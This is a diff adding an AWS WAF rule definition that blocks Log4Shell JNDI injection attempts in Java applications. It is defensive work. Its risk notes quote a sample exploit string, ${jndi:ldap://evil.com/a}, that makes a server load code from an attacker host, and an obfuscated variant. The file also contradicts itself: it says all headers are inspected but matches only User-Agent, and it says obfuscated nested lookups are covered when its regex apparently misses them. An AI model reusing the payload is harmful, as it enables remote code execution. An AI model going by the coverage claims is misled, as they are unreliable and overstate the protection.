@@ -1,0 +1,67 @@
+{
+  "name": "AWS WAF — Block Log4Shell JNDI Injection (CVE-2021-44228)",
+  "vendor": "aws-waf",
+  "category": "injection",
+  "app_context": "java_apps",
+  "objective": "Detect and block Log4Shell exploitation attempts (CVE-2021-44228) by identifying JNDI lookup patterns in all request headers, URI, and body. Targets Java applications using Log4j 2.x in affected versions.",
+  "risk_mitigated": "Remote Code Execution (CVSS 10.0) via Log4j JNDI injection in CVE-2021-44228 and related variants (CVE-2021-45046, CVE-2021-45105). An attacker sends a crafted string (e.g., ${jndi:ldap://evil.com/a}) that is logged by Log4j and triggers an outbound LDAP/RMI connection to load remote code.",
+  "severity": "critical",
+  "mode": "block",
+  "recommended_for": ["java_apps", "web_apps"],
+  "potential_side_effects": "Minimal expected false positives — ${jndi: patterns have no legitimate use in HTTP traffic. Regex-based detection may miss heavily obfuscated variants; pair with OS-level network egress controls for defense in depth.",
+  "tuning_notes": "Deploy in 'Count' mode for 24 hours to baseline, then switch to 'Block'. Variants using obfuscated JNDI syntax (e.g., ${${lower:j}ndi:...) are covered by the broad regex patterns below. Consider also blocking outbound LDAP (port 389/636/1099) at the network level.",
+  "deployment_notes": "This rule targets all input locations (headers, URI, body) because Log4j processes any logged input, including User-Agent and X-Api-Version headers. Enable extended body inspection if your WebACL does not include it by default.",
+  "monitoring_notes": "Any trigger from this rule is a critical alert. Immediately investigate the source IP, the full request, and whether the targeted application logged the string.",
+  "version": "1.0.0",
+  "maturity": "operational",
+  "references": [
+    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+    "https://logging.apache.org/log4j/2.x/security.html",
+    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+  ],
+  "aws_waf_rule": {
+    "Name": "k1n-BlockLog4Shell",
+    "Priority": 1,
+    "Action": {"Block": {}},
+    "VisibilityConfig": {
+      "SampledRequestsEnabled": true,
+      "CloudWatchMetricsEnabled": true,
+      "MetricName": "k1nBlockLog4Shell"
+    },
+    "Statement": {
+      "OrStatement": {
+        "Statements": [
+          {
+            "RegexMatchStatement": {
+              "RegexString": "(?i)\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:",
+              "FieldToMatch": {"Body": {}},
+              "TextTransformations": [{"Priority": 0, "Type": "URL_DECODE"}, {"Priority": 1, "Type": "HTML_ENTITY_DECODE"}]
+            }
+          },
+          {
+            "RegexMatchStatement": {
+              "RegexString": "(?i)\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:",
+              "FieldToMatch": {"UriPath": {}},
+              "TextTransformations": [{"Priority": 0, "Type": "URL_DECODE"}]
+            }
+          },
+          {
+            "RegexMatchStatement": {
+              "RegexString": "(?i)\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:",
+              "FieldToMatch": {"SingleHeader": {"Name": "user-agent"}},
+              "TextTransformations": [{"Priority": 0, "Type": "NONE"}]
+            }
+          },
+          {
+            "RegexMatchStatement": {
+              "RegexString": "(?i)\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:",
+              "FieldToMatch": {"QueryString": {}},
+              "TextTransformations": [{"Priority": 0, "Type": "URL_DECODE"}]
+            }
+          }
+        ]
+      }
+    }
+  },
+  "tags": ["log4shell", "jndi", "cve-2021-44228", "rce", "java", "critical"]
+}
